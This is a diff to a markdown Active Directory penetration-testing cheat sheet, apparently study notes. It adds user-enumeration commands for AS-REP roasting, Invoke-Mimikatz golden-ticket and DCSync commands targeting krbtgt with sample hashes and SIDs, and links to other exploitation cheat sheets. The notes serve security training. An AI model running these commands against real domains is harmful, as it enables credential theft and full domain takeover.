@@ -1,6 +1,4 @@
 # Enumeration
-First, get domainname from NMAP: `nmap -A 192.168.1.50 -Pn` -> under `NetBIOS_Domain_Name: PENTESTING`
-Second, detect if the SMB signing is disabled. When SMB signing is disabled, an attacker can modify the message in transit and perform a relay attack and stealing hashes.
 
 ## Tool 1: crackmapexec
 - Built-in in kali linux
@@ -176,9 +174,13 @@ cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL
 - condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled 
 - Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes
 
-kerbrute - Enumeration Users
+kerbrute - Enumeration Users (use with Preauth not required
 ```
 kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
+OR
+Get-DomainUser -PreauthNotRequired -Verbose
+OR
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
 ```
 https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt
 
@@ -219,7 +221,7 @@ Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket
 Kerberoasting requires a valid domain account.
 Three step process:
 - Find SPN tied to user accounts through LDAP (service accounts)
-- Request a TGS for each SPN
+- Request a TGS for a specific SPN
 - Crack the TGS offline to recover the service account's password
 </aside>
 
@@ -442,6 +444,7 @@ GetDomainsid (PowerView)
 - Creating a golden ticket using Mimikatz, so that user jen will be part of the Domain Admin group.
 ```
 mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
+Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
 ```
 
 - With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt
@@ -498,6 +501,7 @@ https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attac
 #Assuming we have access to a domain joined machine, we launch mimikatz
 #output of lsadump::dcsync is NTLM hash of target user including Administrator
 mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
 ```
 
 ### DCSync on Kali
@@ -736,3 +740,8 @@ kerberos::list
 
 ## Pass the ticket 2
 1. Use Rubeus instead of mimikatz
+
+## Use when trapped
+- https://github.com/drak3hft7/Cheat-Sheet---Active-Directory
+- https://www.netwrix.com/attack.html
+- https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
